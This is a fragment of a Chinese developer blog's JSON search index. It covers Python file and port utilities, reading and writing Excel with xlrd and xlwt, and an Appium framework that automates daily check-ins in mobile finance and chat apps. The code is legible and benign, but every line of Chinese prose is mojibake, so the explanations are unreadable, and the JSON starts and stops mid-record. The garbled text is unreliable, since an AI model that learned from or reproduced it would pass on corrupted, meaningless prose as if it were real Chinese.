æ¯”è¾ƒæ‚ï¼Œé€šè¿‡å…³é”®å­—æœç´¢æ‰¾åˆ°éœ€è¦çš„ï¼Œé•¿æœŸæ›´æ–°ã€‚ DEMO12345678910111213141516171819202122232425262728293031323334353637import time,os,requestsdef mkdir(): '''æ‰¹é‡åˆ›å»ºæ–‡ä»¶å¤¹''' path = input('è¯·è¾“å…¥éœ€è¦åˆ›å»ºæ–‡ä»¶å¤¹çš„ä¸Šçº§è·¯å¾„ï¼š') dirs = [path + '/&#123;&#125;'.format(i) for i in range(100)] for dir in dirs: os.makedirs(dir) print(dirs.index(dir)+1)def create_file(): '''æ‰¹é‡åˆ›å»ºæ–‡ä»¶''' for i in range(10): cmd = r'fsutil file createnew D:\\test\\10G-&#123;&#125;.txt 10737418240'.format(i) # 10737418240ä»£è¡¨10Gå¤§å°ï¼Œå•ä½æ˜¯bï¼Œæ ¹æ®éœ€è¦ä¿®æ”¹å…¶ä»–å¤§å° os.system(cmd) print('ç¬¬%dä¸ªæ–‡ä»¶åˆ›å»ºå®Œæ¯•'%i)def cy_file(): '''æ‰¹é‡å¤åˆ¶æ–‡ä»¶''' for i in range(1,100): cmd = r'copy E:\\test1\\0001.txt E:\\test2\\000&#123;&#125;.txt'.format(i) #ä½¿ç”¨æ—¶ä¿®æ”¹åŸè·¯å¾„å’Œç›®æ ‡è·¯å¾„ os.system(cmd) print('%d.txt' % i + ' å¤åˆ¶å®Œæ¯•')def search_port(): '''æŸ¥è¯¢ç«¯å£å ç”¨''' port = input('è¯·è¾“å…¥ç«¯å£å·:') pid = os.popen(r'netstat -ano | findstr %s' % port).read().split(' ')[-1] # æŒ‰ç…§ç©ºæ ¼åˆ†éš”ï¼Œåªå–æœ€åçš„pidå· task = os.popen(r'tasklist | findstr %s' % pid).read() # æ ¹æ®pidæ‰¾åˆ°å¯¹åº”çš„ç¨‹åº print('å ç”¨æ­¤ç«¯å£çš„ç¨‹åºæ˜¯ï¼š ' + task)if __name__ == '__main__': pass peili","categories":[{"name":"æµ‹è¯•","slug":"æµ‹è¯•","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"cmd","slug":"cmd","permalink":"http://yoursite.com/tags/cmd/"},{"name":"ç³»ç»Ÿå‘½ä»¤","slug":"ç³»ç»Ÿå‘½ä»¤","permalink":"http://yoursite.com/tags/%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4/"}]},{"title":"pythonè¯»å†™excelè¡¨æ ¼","slug":"pythonè¯»å†™excelè¡¨æ ¼","date":"2018-01-29T05:03:00.000Z","updated":"2018-12-17T02:30:56.779Z","comments":true,"path":"2018/01/29/pythonè¯»å†™excelè¡¨æ ¼/","link":"","permalink":"http://yoursite.com/2018/01/29/python%E8%AF%BB%E5%86%99excel%E8%A1%A8%E6%A0%BC/","excerpt":"","text":"å‰æ®µæ—¶é—´æ¥å£è‡ªåŠ¨åŒ–æµ‹è¯•ç”¨excelè¡¨æ¥ç®¡ç†ç”¨ä¾‹ï¼Œè¯»å–å†™å…¥çš„æ—¶å€™é‡åˆ°äº†ä¸€äº›å°å‘ï¼Œåœ¨æ­¤åšè®°å½•ã€‚æ“ä½œexcelè¡¨çš„pythonåº“æœ‰å¾ˆå¤šï¼Œè¿™é‡Œåªä»‹ç»è‡ªå·±ä½¿ç”¨ä¸­æ„Ÿè§‰å…¼å®¹æ€§æœ€å¥½æœ€å®¹æ˜“ä½¿ç”¨çš„xlrdå’Œxlwtï¼Œä½¿ç”¨æ–¹æ³•æ¯”è¾ƒç®€å•ï¼Œç›´æ¥æŸ¥çœ‹ä»¥ä¸‹demoå³å¯ã€‚ è¯»å–æ•°æ®12345678#é¦–å…ˆå¯¼å…¥xlrdæ¨¡å—import xlrdworkbook = xlrd.open_workbook('E:/interface_test/test_data.xls') # æ‰“å¼€æµ‹è¯•æ•°æ®è¡¨table1 = workbook.sheets()[0] # é€‰æ‹©è¯¥excelæ–‡ä»¶çš„ç¬¬ä¸€å¼ è¡¨ï¼Œåºå·ä»0å¼€å§‹login_url = table1.cell(0,1).value #è·å–ç™»é™†urlï¼Œç¬¬ä¸€è¡Œç¬¬äºŒåˆ—name = table1.cell(2,0).value #è·å–ç™»é™†åï¼Œç¬¬ä¸‰è¡Œç¬¬ä¸€åˆ—pwd = int(table1.cell(2, 1).value) #è·å–ç™»é™†å¯†ç ï¼Œç¬¬ä¸‰è¡Œç¬¬äºŒåˆ— æ³¨æ„ table1.cell(x,y).valueæ–¹æ³•è·å–åˆ°çš„è¡¨æ ¼æ•°æ®æ˜¯stræ ¼å¼ï¼Œå¯èƒ½ç”¨å…¶ä»–æ–¹æ³•è·å–çš„è¯ä¸ä¸€å®šæ˜¯strï¼Œæ ¹æ®è‡ªå·±çš„éœ€è¦æ¥è½¬æ¢æ ¼å¼ å†™å…¥æ•°æ®æ–¹æ³•ä¸€12345678#é¦–å…ˆå¯¼å…¥xlwtæ¨¡å—import xlwtworkbook = xlwt.Workbook()sheet = workbook.add_sheet('sheet1', cell_overwrite_ok=True) #è®¾ç½®éœ€è¦æ“ä½œå¾—è¡¨åsheet.write(5,6,'è¿™æ˜¯ä¸€æ¡æµ‹è¯•ä¿¡æ¯') #åœ¨ç¬¬6è¡Œç¬¬7åˆ—å†™å…¥å†…å®¹workbook.save('E:/interface_test/test_data1.xls') #å‘½åå¹¶ä¿å­˜print(\"å†™å…¥æˆåŠŸ\") æ–¹æ³•äºŒ12345678910#é¦–å…ˆå¯¼å…¥xlrdå’Œxlutils.copyæ¨¡å—import xlrdfrom xlutils.copy import copyoldWb = xlrd.open_workbook('E:/interface_test/test_data2.xls',formatting_info=True)#æ‰“å¼€éœ€è¦å†™å…¥çš„excelæ–‡ä»¶newWb = copy(oldWb)newWs = newWb.get_sheet(0) #è·å–excelæ–‡ä»¶çš„ç¬¬ä¸€å¼ è¡¨newWs.write(2, 2, 'éœ€è¦å†™å…¥çš„å†…å®¹') # ç¬¬3è¡Œç¬¬3åˆ—å†™å…¥å†…å®¹newWb.save('E:/interface_test/test_data2.xls') #ä¿å­˜print(\"å†™å…¥æˆåŠŸ\") æ³¨æ„ æ–¹æ³•ä¸€æ›´å¤šæ—¶å€™æ˜¯æ“ä½œæ–°è¡¨æ ¼ï¼Œå¯¹äºå·²ç»å­˜åœ¨çš„è¡¨æ ¼å¤„ç†å°±ä¸æ˜¯å¾ˆæ–¹ä¾¿äº†ï¼Œæ’å…¥æ–°å†…å®¹æ—¶ä¼šæŠŠå·²ç»å­˜åœ¨çš„å†…å®¹æ¸…ç©ºï¼Œæ–¹æ³•äºŒæ›´é€‚åˆæ“ä½œå·²ç»å­˜åœ¨ä¸”æ–‡ä»¶é‡Œé¢æœ‰å†…å®¹çš„è¡¨æ ¼ã€‚ å¯ä»¥çœ‹åˆ°æˆ‘ä¸Šé¢ä¸¤ç§æ“ä½œçš„excelæ–‡ä»¶æ˜¯xlsæ ¼å¼ï¼Œç›®å‰office2013ï¼Œ2016ç‰ˆæœ¬æ–°å»ºçš„æ–‡ä»¶é»˜è®¤æ˜¯xlsxæ ¼å¼ï¼Œåœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­å‘ç°å¯¹xlsxæ ¼å¼çš„æ–‡ä»¶ä¸€ç›´å†™å…¥å¤±è´¥ï¼Œè¿™æ˜¯è¿™ä¸¤ä¸ªæ¨¡å—æœ¬èº«çš„åŠŸèƒ½ä¸è¶³ï¼Œæ‰€ä»¥åœ¨ä½¿ç”¨æ—¶å°½é‡ç”¨xlsæ ¼å¼çš„æ–‡ä»¶ã€‚ å¾€è¡¨æ ¼å†™å…¥å†…å®¹çš„æ—¶å€™ï¼Œè¡¨æ ¼ä¸èƒ½æ˜¯æ‰“å¼€çŠ¶æ€ï¼Œå¦åˆ™ä¼šå†™å…¥å¤±è´¥ï¼Œåœ¨æ‰§è¡Œè„šæœ¬å‰å°†è¯¥æ–‡ä»¶å…³é—­ã€‚peili","categories":[{"name":"æµ‹è¯•","slug":"æµ‹è¯•","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"æ‰“é€ è‡ªå·±çš„APPä»»åŠ¡æ± ","slug":"æ‰“é€ è‡ªå·±çš„APPä»»åŠ¡æ± ","date":"2017-12-19T15:40:00.000Z","updated":"2018-12-17T02:30:56.767Z","comments":true,"path":"2017/12/19/æ‰“é€ è‡ªå·±çš„APPä»»åŠ¡æ± /","link":"","permalink":"http://yoursite.com/2017/12/19/%E6%89%93%E9%80%A0%E8%87%AA%E5%B7%B1%E7%9A%84APP%E4%BB%BB%E5%8A%A1%E6%B1%A0/","excerpt":"","text":"é¡¹ç›®èƒŒæ™¯[é¡¹ç›®åœ°å€ç‚¹å‡»è¿™é‡Œ]ï¼Œæ•´ä½“é¡¹ç›®æ¡†æ¶é€šè¿‡python+appium+unittestå®ç°ï¼Œå‚ç…§é¡¹ç›®æºç é£Ÿç”¨æœ¬ç¯‡æ–‡ç« æ›´ä½³ã€‚ å¦‚ä»Šæ‰‹æœºé‡Œé¢ç°åœ¨è¶Šæ¥è¶Šå¤šçš„APPéœ€è¦æ¯å¤©è¿›è¡Œç­¾åˆ°ï¼Œç‚¹èµï¼Œè¯„è®ºï¼Œå®šæ—¶ç»™æŸäººå‘æ¶ˆæ¯ï¼Œè½¬è´¦ç­‰æ“ä½œï¼Œæœ¬æ¥æƒ³çš„æ˜¯ç”¨æ¥å£è‡ªåŠ¨åŒ–æ¥å®ç°ï¼Œæ“ä½œçš„æ—¶å€™å‘ç°å¾ˆå¤šAPPçš„æ¥å£(å°¤å…¶é‡‘èç±»)æ¯”è¾ƒéº»çƒ¦ï¼Œuserkeyã€tokenç­‰å­—æ®µéƒ½æ˜¯åŠ å¯†ä¸”å®æ—¶å˜åŒ–çš„ï¼Œå¹¶ä¸”æ¥å£ä¹‹é—´çš„å…³è”è€¦åˆä¸å¤ªå®¹æ˜“æ•´ç†ï¼Œä¸€ä¸ªä¸ªæ‰¾æ¥å£å»ç­¾åˆ°çš„è¯æ¯”è¾ƒè´¹æ—¶è´¹åŠ›ã€‚æ‰€ä»¥è½¬è€Œç”¨UIè‡ªåŠ¨åŒ–æ¥å®ç°ï¼Œpython+appium+unittestå†™å¥½æ¡†æ¶ï¼Œä»¥åæœ‰æ–°çš„APPåªè¦ç”¨å‡ åˆ†é’Ÿæ—¶é—´æŠŠè¿™ä¸ªAPPçš„ä»»åŠ¡æ·»åŠ ä¸€ä¸‹å°±å¥½äº†ï¼Œä¸‹æ–‡ä¸­çš„æ¯ä¸€æ¡APPä»»åŠ¡å®é™…å°±æ˜¯è‡ªåŠ¨åŒ–æµ‹è¯•ä¸­çš„æ¯ä¸€æ¡æµ‹è¯•ç”¨ä¾‹ã€‚ æ­¤æ¡†æ¶åªæœ‰åœ¨æ‰§è¡Œä»»åŠ¡çš„æ—¶å€™æ‰ä¼šå¯åŠ¨æœåŠ¡å’Œå®‰å“æ¨¡æ‹Ÿå™¨ï¼Œæ‰§è¡Œå®Œæ¯•åè‡ªåŠ¨å…³é—­æ‰€æœ‰æœåŠ¡å’Œæ¨¡æ‹Ÿå™¨è¿›ç¨‹ï¼Œå…¶ä»–æ—¶æ®µä¸ä¼šå ç”¨æµªè´¹æœºå™¨èµ„æºï¼Œå¦å¤–å†™æ­¤æ¡†æ¶çš„ä¸»è¦ç›®çš„æ˜¯æ›¿ä»£æ‰‹å·¥æ¯å¤©èƒ½å®šæ—¶è·‘ï¼Œæ‰€ä»¥åœ¨ä»»åŠ¡è¿è¡Œæ—¶æ®µWindowsæœºå™¨éœ€è¦æ­£å¸¸ç¨³å®šï¼Œä¸€èˆ¬æ”¾åœ¨åŠå¤œå‡Œæ™¨æ‰§è¡Œã€‚ ç¯å¢ƒå‡†å¤‡ä»¥ä¸‹æ˜¯æˆ‘ä½¿ç”¨æ—¶å€™çš„ç‰ˆæœ¬ï¼Œæ ¹æ®è‡ªå·±æƒ…å†µå®‰è£…æ–°ç‰ˆçš„å°±è¡Œï¼Œç‰ˆæœ¬ä¸è¦å¤ªæ—§ã€‚ JDK (1.8.0_91) SDK (25.1.7) python 3 node.js (v6.11.0) appium server (1.4.16) Appium-Python-Client (0.24) é›·ç”µå®‰å“æ¨¡æ‹Ÿå™¨ï¼ˆå®‰å“5.1.1ï¼Œ720*1280ï¼‰ é¡¹ç›®è¯¦è§£æµç¨‹å›¾ç®€ä»‹ 1. è·å–è®¾å¤‡åæ‰‹æœºè¿æ¥ç”µè„‘æˆ–è€…æ‰“å¼€ç”µè„‘ä¸Šçš„å®‰å“æ¨¡æ‹Ÿå™¨ï¼Œåœ¨cmdå‘½ä»¤è¡Œç›´æ¥è¾“å…¥adb devicesæŸ¥çœ‹è®¾å¤‡åï¼Œä¸‹é¢çš„emulator-5554å°±æ˜¯è®¾å¤‡åã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæœ‰äº›æ¨¡æ‹Ÿå™¨è‡ªå¸¦çš„adb.exeå·¥å…·ä¸SDKè‡ªå¸¦çš„adbä¼šå†²çªï¼Œå…·ä½“è¡¨ç°å°±æ˜¯æ‰“å¼€äº†æ¨¡æ‹Ÿå™¨åï¼Œadbå‘½ä»¤ä¸èƒ½æ­£å¸¸æ‰§è¡Œï¼Œå› ä¸ºè¿›ç¨‹å†²çªäº†ï¼Œè§£å†³åŠæ³•æ˜¯åœ¨æ¨¡æ‹Ÿå™¨å®‰è£…è·¯å¾„æ‰¾åˆ°adb.exeï¼ŒæŠŠå®ƒé‡æ–°å‘½åæˆ–è€…ç›´æ¥åˆ é™¤ã€‚ 123C:\\Users\\pei&gt;adb devicesList of devices attachedemulator-5554 device 2. å¯åŠ¨/å…³é—­appiumæœåŠ¡å¯åŠ¨å‘½ä»¤1appium -a 127.0.0.1 -p 4723 -bp 4728 --chromedriver-port 9519 -U emulator-5554 -a æ˜¯æŒ‡å®šç›‘å¬çš„ipï¼ˆä¹Ÿå¯å†™æˆ â€“addressï¼‰ï¼Œé»˜è®¤æ˜¯æœ¬åœ°IP 127.0.0.1ï¼Œå¯ä¿®æ”¹ï¼› -p æ˜¯æŒ‡å®šç›‘å¬çš„ç«¯å£ï¼ˆä¹Ÿå¯å†™æˆ â€“portï¼‰ï¼Œå¯ä»¥ä¿®æ”¹ä¸ºä½ éœ€è¦çš„ç«¯å£ï¼› -bp æ˜¯è¿æ¥Androidè®¾å¤‡bootstrapçš„ç«¯å£å·ï¼Œé»˜è®¤æ˜¯4724ï¼ˆä¹Ÿå¯å†™æˆâ€“bootstrap-portï¼‰ â€“chromedriver-port æ˜¯chromedriverè¿è¡Œéœ€è¦æŒ‡å®šçš„ç«¯å£å·ï¼Œé»˜è®¤æ˜¯9515 -U æ˜¯è¿æ¥çš„è®¾å¤‡åç§°ï¼Œå³â€adb devicesâ€è·å–çš„è®¾å¤‡åï¼ˆä¹Ÿå¯å†™æˆâ€“udidï¼‰æ³¨ï¼šå¦‚æœåªè¿æ¥äº†ä¸€å°è®¾å¤‡çš„è¯ï¼Œä¸Šé¢è¿™äº›å‚æ•°ä¹Ÿå¯ä»¥ä¸ç”¨æŒ‡å®šï¼Œç›´æ¥åœ¨å‘½ä»¤è¡Œå†™appiumå¯åŠ¨å°±å¥½ã€‚ æ‰¹å¤„ç†æ–‡ä»¶ä»¥ä¸Šå‘½ä»¤é€šè¿‡pythonè„šæœ¬è°ƒç”¨ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œä»¥åä¸å¤ªæ–¹ä¾¿ç›´æ¥ä¸­æ–­è¿›ç¨‹ï¼Œå› æ­¤æ¢ä¸€ä¸ªæ€è·¯ï¼Œå°†å®ƒå†™åˆ°.batæ‰¹å¤„ç†æ–‡ä»¶ï¼Œé€šè¿‡è„šæœ¬æ¥å¯åŠ¨æ‰§è¡Œè¿™ä¸ªæ–‡ä»¶ï¼Œä»»åŠ¡ç»“æŸåï¼Œå†å¯åŠ¨ä¸€ä¸ªæ‰¹å¤„ç†æ–‡ä»¶ï¼Œè·å–å¯åŠ¨appiumæœåŠ¡çš„çª—å£å¥æŸ„å¹¶ç”¨taskkillå¼ºåˆ¶å…³é—­ï¼Œå®ç°æ–¹æ³•åˆ†åˆ«å¦‚ä¸‹ã€‚ 1234rem å¯åŠ¨appiumæœåŠ¡@echo offtitle start_appium_servercmd &#x2F;c &quot;appium -a 127.0.0.1 -p 4723 -bp 4728 --chromedriver-port 9519 -U emulator-5554&quot; 1234567rem å…³é—­appiumæœåŠ¡@echo offtitle stop_appium_servertasklist -v | find &quot;start_appium_server&quot;&gt;nulif %errorlevel%&#x3D;&#x3D;0 (taskkill -fi &quot;WINDOWTITLE eq start_appium_server&quot;) 3. å¯åŠ¨/å…³é—­å®‰å“æ¨¡æ‹Ÿå™¨åœ¨å®‰å“æ¨¡æ‹Ÿå™¨çš„å®‰è£…ç›®å½•æ‰¾åˆ°å¯åŠ¨æ¨¡æ‹Ÿå™¨çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå°†å®ƒçš„è·¯å¾„å¤åˆ¶å‡ºæ¥ï¼Œåœ¨cmdé‡Œè¾“å…¥start +è·¯å¾„å‘½ä»¤å°±èƒ½ç›´æ¥å¯åŠ¨æ¨¡æ‹Ÿå™¨ï¼Œä¾‹å¦‚æˆ‘è¿™é‡Œæ˜¯é›·ç”µæ¨¡æ‹Ÿå™¨ï¼Œå…¶ä»–çš„ç±»ä¼¼ï¼š 1start D:\\Application\\dnplayer2\\dnplayer.exe å…³é—­æ¨¡æ‹Ÿå™¨çš„è¯ç›´æ¥taskkillç»“æŸè¿›ç¨‹åå°±å¥½ã€‚ 1taskkill -f -im dnplayer.exe å°†è¿™ä¸¤ä¸ªå‘½ä»¤å†™åˆ°ä¸€ä¸ªpythonæ–‡ä»¶çš„ä¸¤ä¸ªå‡½æ•°ä¸­ï¼Œæ–¹ä¾¿åé¢ç»Ÿä¸€è°ƒç”¨æ‰§è¡Œã€‚ 1234567891011121314#coding=utf-8import osdef start_android_devices(): '''å¯åŠ¨å®‰å“æ¨¡æ‹Ÿå™¨''' command = r'start D:\\Application\\dnplayer2\\dnplayer.exe' os.system(command) print('æ¨¡æ‹Ÿå™¨å¯åŠ¨æˆåŠŸ')def stop_android_devices(): '''ç»“æŸå®‰å“æ¨¡æ‹Ÿå™¨è¿›ç¨‹''' command = r'taskkill -f -im dnplayer.exe' os.system(command) print('æ‰€æœ‰ä»»åŠ¡æ‰§è¡Œå®Œæ¯•ï¼Œå…³é—­æ¨¡æ‹Ÿå™¨') 4. æ‰§è¡ŒAPPä»»åŠ¡è¿™éƒ¨åˆ†æ˜¯æ•´ä¸ªæ¡†æ¶çš„ä¸»ä½“éƒ¨åˆ†ï¼Œæ¯ä¸ªAPPçš„æ‰§è¡Œä»£ç éƒ½å†™åœ¨è¿™é‡Œï¼Œç”¨åˆ°unittestå•å…ƒæµ‹è¯•æ¡†æ¶ï¼Œæ‰€æœ‰çš„å‡½æ•°å†™åœ¨AppTaskç±»ä¸­ï¼ŒAppTaskç»§æ‰¿unittest.TestCaseæ–¹æ³•ã€‚ åŸºç¡€æ¨¡å—åŸºç¡€æ¨¡å—å°è£…äº†å…¨éƒ¨APPä»»åŠ¡éƒ½è¦ç”¨åˆ°çš„å…¬å…±æ–¹æ³•ï¼Œè¿™é‡Œåˆ†ä¸ºä¸¤éƒ¨åˆ†ã€‚ ä¸€æ˜¯æ¯ä¸ªAPPä»»åŠ¡çš„ç¬¬ä¸€æ­¥ï¼Œå³å¯åŠ¨APPï¼Œæ­¤å¤„æ²¡æœ‰ç”¨unittestè‡ªå¸¦çš„setUp()æ–¹æ³•ï¼Œè€Œæ˜¯è‡ªå®šä¹‰äº†ä¸€ä¸ªbasicå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯APPçš„åŒ…åå’Œå¯åŠ¨APPçš„activityåï¼ŒAPPä»»åŠ¡çš„ç¬¬ä¸€æ­¥éƒ½æ˜¯å…ˆè°ƒç”¨è¿™ä¸ªå…¬å…±å‡½æ•°ï¼Œå°†driverå®šä¹‰æˆå…¨å±€å˜é‡ã€‚æ³¨æ„ï¼šwebdriver.Remoteæ–¹æ³•ç¬¬ä¸€ä¸ªurlå‚æ•°ä¸­é—´çš„ç«¯å£å·è¦ä¸ä¸Šé¢å¯åŠ¨appium serverçš„ç«¯å£å·ä¸€è‡´ï¼Œé»˜è®¤æ˜¯4723ã€‚ 12345678910111213def basic(package_name,activity_name): '''å¯åŠ¨åº”ç”¨''' global driver desired_caps = &#123;&#125; desired_caps['platformName'] = 'Android' desired_caps['platformVersion'] = '5.1' desired_caps['deviceName'] = 'emulator-5554' desired_caps['appPackage'] = package_name desired_caps['appActivity'] = activity_name desired_caps[\"unicodeKeyboard\"] = \"True\" desired_caps[\"resetKeyboard\"] = \"True\" driver = webdriver.Remote('http://localhost:4723/wd/hub', desired_caps) time.sleep(20) äºŒæ˜¯æ¯ä¸ªAPPä»»åŠ¡ç»“æŸåé€€å‡ºåº”ç”¨ï¼Œé‡Šæ”¾appiumå®ä¾‹ï¼Œå°†å…³é—­APPçš„ä»£ç å†™åœ¨unittestè‡ªå¸¦çš„tearDown()æ–¹æ³•é‡Œé¢ï¼Œè¿™ä¸ªæ–¹æ³•ä¸ç”¨å†™åœ¨æ•´ä¸ªæ–‡ä»¶çš„æœ€åé¢ï¼Œæ¯æ‰§è¡Œä¸€ä¸ªtestå¼€å¤´çš„ä»»åŠ¡åï¼Œéƒ½ä¼šè‡ªåŠ¨æ‰§è¡ŒtearDown()ã€‚ 123def tearDown(self): '''å…³é—­åº”ç”¨''' driver.quit() APPä»»åŠ¡æ¯ä¸€ä¸ªAPPä»»åŠ¡éƒ½å†™æˆä¸€ä¸ªå‡½æ•°ï¼Œä¸ºäº†ä½¿ç”¨unittestæ¡†æ¶å¿«é€Ÿæ‰¹é‡æ‰§è¡Œï¼Œå‘½åéƒ½ä»¥testå¼€å¤´ï¼Œä¾‹å¦‚äº¬ä¸œé‡‘ètest_001_jd_financï¼Œç„¶ååœ¨è¯¥å‡½æ•°çš„ç¬¬ä¸€æ­¥å…ˆè°ƒç”¨ä¸Šé¢å°è£…çš„basic(package_name,activity_name)å‡½æ•°æ¥å¯åŠ¨åº”ç”¨ï¼Œä¸¤ä¸ªå‚æ•°åˆ†åˆ«å°±æ˜¯äº¬ä¸œé‡‘èAPPçš„åŒ…åå’Œå¯åŠ¨APPçš„activityåï¼Œä¸‹é¢ä»¥äº¬ä¸œé‡‘èä¸ºä¾‹ã€‚ 123456789101112131415161718192021222324def test_001_jd_finance(self): '''äº¬ä¸œé‡‘èç­¾åˆ°/é¢†å–æé¢åŒ…''' #----------å¯åŠ¨åº”ç”¨---------- AppTask.basic('com.jd.jrapp','.WelcomeActivity') #----------ä¹å®«æ ¼æ»‘åŠ¨è§£é”---------- TouchAction(driver).press(x=180, y=598).move_to(x=0, y=0).wait(100).move_to(x=0, y=181).wait(100).move_to(x=0, y=181).wait(100).move_to(x=181, y=0).wait(100).move_to(x=181,y=0).release().perform() time.sleep(2) # ----------æ£€éªŒæ˜¯å¦æœ‰æ›´æ–°---------- update = driver.page_source.find('è·³è¿‡') #åˆ¤æ–­æ˜¯å¦æœ‰æ›´æ–°æŒ‰é’® if update != -1: driver.find_element_by_id('com.jd.jrapp:id/cancel').click() #ç‚¹å‡»\"è·³è¿‡\"ï¼Œä¸æ›´æ–° time.sleep(1) else: pass #----------ä¸ªäººä¸­å¿ƒç­¾åˆ°---------- driver.find_element_by_id('com.jd.jrapp:id/fourthLayout').click() #ç‚¹å‡»ä¸ªäººä¸­å¿ƒ time.sleep(1) driver.swipe(100,500,100,500,10) #ç‚¹å‡»\"ç­¾åˆ°\"æŒ‰é’® time.sleep(20) #----------æ–­è¨€æ˜¯å¦æˆåŠŸ---------- self.assertIn('å·²ç­¾', driver.page_source,msg='ä»»åŠ¡æœ‰å¤±è´¥ï¼Œè¯·åˆ°æˆªå›¾ç›®å½•æŸ¥çœ‹æˆªå›¾'+str(screenshot_path)) æ¯ä¸ªAPPä»»åŠ¡çš„æœ€åé¢éƒ½ç”¨assertæ¥æ–­è¨€ï¼Œæ–­è¨€æ–¹æ³•æœ‰å¾ˆå¤šç§(assertInï¼ŒassertNotInï¼ŒassertEqualâ€¦)ï¼Œå…·ä½“æ–¹æ³•[ç‚¹å‡»æ­¤å¤„æŸ¥çœ‹]ï¼Œè¿™é‡Œåªåˆ¤æ–­é¡µé¢ä¸­æœ‰æ²¡æœ‰ç­¾åˆ°æˆåŠŸçš„å­—æ ·ï¼Œå°±ç”¨assertInåŒ…å«å…³ç³»æ¥æ–­è¨€ï¼Œç¬¬ä¸€ä¸ªå‚æ•°åŒ…å«åœ¨ç¬¬äºŒä¸ªå‚æ•°å†…ï¼Œç¬¬äºŒä¸ªå‚æ•°ç”¨driver.page_sourceæ–¹æ³•è·å–å½“å‰é¡µé¢æ‰€æœ‰å…ƒç´ ï¼Œmsgå‚æ•°æ˜¯æç¤ºä¿¡æ¯ã€‚ å…·ä½“åˆ°æ¯ä¸ªAPPä»»åŠ¡é‡Œé¢é™¤äº†åŸºç¡€çš„åŠŸèƒ½å®ç°å¤–ï¼Œæœ€é‡è¦çš„å°±æ˜¯åšå¥½å„ç§å®¹é”™å¤„ç†ï¼Œå“ªä¸ªé¡µé¢çªç„¶å°±æœ‰äº†æ´»åŠ¨æˆ–è€…å¹¿å‘Šå¼¹çª—ï¼Œåˆæˆ–è€…åº”ç”¨çªç„¶è·³å‡ºæ›´æ–°çš„çª—å£ç­‰ç­‰ï¼Œå°±ä¼šæ‰“æ–­ä»»åŠ¡çš„æ‰§è¡Œè¿‡ç¨‹ï¼Œå› æ­¤åœ¨å†™è„šæœ¬çš„æ—¶å€™å°½é‡ç†Ÿæ‚‰APPçš„æ“ä½œé€»è¾‘ï¼Œå¯¹å¼¹çª—åšå¥½å®¹é”™å¤„ç†ï¼Œå¹¶åŠ ä¸Šé€‚é‡çš„æ‰“å°ä¿¡æ¯å’Œæˆªå›¾æ–¹ä¾¿è°ƒè¯•å’Œæ’æŸ¥é”™è¯¯ã€‚ æ•´ä½“ä»»åŠ¡ç»“æ„ç›®å‰ä»»åŠ¡å¹¶ä¸æ˜¯å¾ˆå¤šæ‰€æœ‰APPéƒ½å†™åœ¨ä¸€ä¸ªpythonæ–‡ä»¶é‡Œï¼Œä»¥åæœ‰æ–°å¢çš„ä»»åŠ¡å°±ç›´æ¥åœ¨è¿™ä¸ªæ–‡ä»¶æœ€ä¸‹é¢æ·»åŠ æ–°çš„å‡½æ•°å³å¯ï¼ŒåæœŸå¦‚æœä»»åŠ¡è¾ƒå¤šå¯ä»¥è€ƒè™‘åˆ†å¼€ï¼Œæ¯ä¸ªä»»åŠ¡å•ç‹¬ä¸€ä¸ªpythonæ–‡ä»¶ï¼Œæˆ–è€…åŒç±»å‹çš„ä»»åŠ¡å†™åœ¨ä¸€ä¸ªæ–‡ä»¶ã€‚ 12345678910111213141516171819202122#coding=utf-8from appium import webdriverfrom appium.webdriver.common.touch_action import TouchActionimport time,random,unittestclass AppTask(unittest.TestCase): def basic(package_name,activity_name): '''å¯åŠ¨åº”ç”¨''' def tearDown(self): '''å…³é—­åº”ç”¨''' def test_001_jd_finance(self): '''äº¬ä¸œé‡‘èä»»åŠ¡''' def test_002_qq(self): '''qqä»»åŠ¡''' def test_003_alipay(self): '''æ”¯ä»˜å®ä»»åŠ¡''' ... 5. æ•´åˆå‰é¢å·²ç»æ˜ç¡®äº†appium serverï¼Œå®‰å“æ¨¡æ‹Ÿå™¨ä»¥åŠå…·ä½“APPä»»åŠ¡çš„å¯åŠ¨å’Œå…³é—­è¿‡ç¨‹ï¼Œå°†è¿™äº›è¿‡ç¨‹æ•´åˆå•ç‹¬å†™åœ¨ä¸€ä¸ªrun.pyæ–‡ä»¶æ¥ç®¡ç†ï¼Œä¹Ÿå°±æ˜¯å¯åŠ¨è¿è¡Œæ•´ä¸ªæ¡†æ¶çš„æ–‡ä»¶ã€‚åœ¨è¿™ä¸ªæ–‡ä»¶é‡Œï¼Œæœ‰ä¸¤ä¸ªä¸»è¦çš„å‡½æ•°ã€‚ ä¸€ä¸ªæ˜¯æ‰¹é‡æ‰§è¡ŒAPPä»»åŠ¡å¹¶åŒæ—¶ç”ŸæˆHTMLç»“æœæŠ¥å‘Šçš„å‡½æ•°è®¾ç½®å¥½APPä»»åŠ¡æ‰€åœ¨çš„è·¯å¾„åï¼Œç”¨unittest.defaultTestLoader.discoveræ–¹æ³•æ‰¹é‡æ‰§è¡Œä»»åŠ¡ï¼ŒåŒæ—¶ç”¨HTMLTestRunnerç”Ÿæˆæµ‹è¯•æŠ¥å‘Šã€‚ 1234567891011test_path = 'E:/daily_task_2'report_path = 'E:/daily_task_2/report/'def run_tasks(): '''æ‰§è¡Œæ‰€æœ‰APPä»»åŠ¡''' discover = unittest.defaultTestLoader.discover(test_path, pattern='test_*.py') now = time.strftime('%Y-%m-%d') filename = report_path + now + ' result.html' # è¿™ä¸ªfilenameæ˜¯ç”Ÿæˆçš„è‡ªåŠ¨åŒ–æµ‹è¯•æŠ¥å‘Šçš„æ–‡ä»¶å fp = open(filename, 'wb') runner = HTMLTestRunner(stream=fp, title='APPä»»åŠ¡æ‰§è¡Œæƒ…å†µ') runner.run(discover) fp.close() 